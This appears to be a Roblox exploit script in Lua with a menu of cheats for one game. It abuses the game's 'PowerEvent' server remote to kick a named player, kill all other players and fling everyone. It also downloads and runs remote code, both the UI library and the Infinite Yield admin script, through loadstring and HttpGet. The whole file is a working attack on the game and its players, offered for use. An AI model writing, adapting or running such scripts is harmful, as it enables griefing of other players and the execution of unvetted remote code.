local LoadedGui = game.CoreGui:FindFirstChild("")
if LoadedGui then
    LoadedGui:Destroy()
end
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/IreXion-UI-Library/main/Revamp/IreXion%20UI%20Library"))()
local Gui = Library:AddGui({
    Title = {"ate", "ate"},
    ThemeColor = Color3.fromRGB(0, 255, 0),
    ToggleKey = Enum.KeyCode.RightControl,
})

local Misc = Gui:AddTab("Misc")
local M = Misc:AddCategory("Misc")
local Char = Gui:AddTab("Characters")
local C = Char:AddCategory("Characters")
local Tele = Gui:AddTab("Teleports")
local T = Tele:AddCategory("Teleports")
local Map = Gui:AddTab("Map")
local M1 = Map:AddCategory("Map")

M:AddBox("Kick Player",function(plr)
    local Players = game:GetService("Players")
    local msg = plr
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    print(player)
    local Path_To_Part = game.Players[player.Name]
    local args = {
        [1] = "HydroThermo",
        [2] = "TrackThermo",
        [3] = Path_To_Part
    }
    game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))
    wait(0.01)
    local args = {
        [1] = "HydroThermo",
        [2] = "BoilEndTerrain",
        [3] = Path_To_Part
    }
    game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))
end)
M:AddButton("Infinite Yeild",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)
M:AddButton("Self Dry",function()
    local args = {
        [1] = "Dry",
        [2] = game:GetService("Players").LocalPlayer.Character
    }
    
    game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))    
end)
M:AddButton("Kill Everyone",function()
    local plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do
        if Player.Character ~= nil and Player ~= plr then
            local mag = (Player.Character.UpperTorso.Position - plr.Character.UpperTorso.Position).magnitude
            if mag < 999999 then
                local Target = Player.Character or Player.CharacterAdded:Wait()
                local Hum = Target.HumanoidRootPart
                local pos = Hum.CFrame
                local pos2 = pos.p
                local x = math.round(pos2.X)
                local y = math.round(pos2.Y)
                local z = math.round(pos2.Z)
                local args = {
                    [1] = "HydroThermo",
                    [2] = "TrackThermo",
                    [3] = Target.Head
                }
                
                game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))
                wait(0.01)
                local args = {
                    [1] = "HydroThermo",
                    [2] = "BoilEndTerrain",
                    [3] = Target.Head
                }
                
                game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))                
            end
        end
    end
end)
M:AddButton("Fling Everyone",function()
    local plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do
        if Player.Character ~= nil and Player ~= plr then
            local mag = (Player.Character.UpperTorso.Position - plr.Character.UpperTorso.Position).magnitude
            if mag < 999999 then
                local Target = Player.Character or Player.CharacterAdded:Wait()
                local args = {
                    [1] = "Aerokinesis",
                    [2] = "AeroStart",
                    [3] = Target
                }
                
                game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))            
            end
        end
    end
    wait(0.02)
    local plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do
        if Player.Character ~= nil and Player ~= plr then
            local mag = (Player.Character.UpperTorso.Position - plr.Character.UpperTorso.Position).magnitude
            if mag < 999999 then
                local Target = Player.Character or Player.CharacterAdded:Wait()
                local args = {
                    [1] = "Aerokinesis",
                    [2] = "AeroMove",
                    [3] = Target,
                    [4] = Vector3.new(0, 99999, -0)
                }

                game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))    
            end
        end
    end
    wait(4)
    local plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do
        if Player.Character ~= nil and Player ~= plr then
            local mag = (Player.Character.UpperTorso.Position - plr.Character.UpperTorso.Position).magnitude
            if mag < 999999 then
                local Target = Player.Character or Player.CharacterAdded:Wait()
                local args = {
                    [1] = "Aerokinesis",
                    [2] = "AeroEnd",
                    [3] = Target
                }
                
                game:GetService("ReplicatedStorage").Events.PowerEvent:FireServer(unpack(args))            
            end
        end
    end
end)
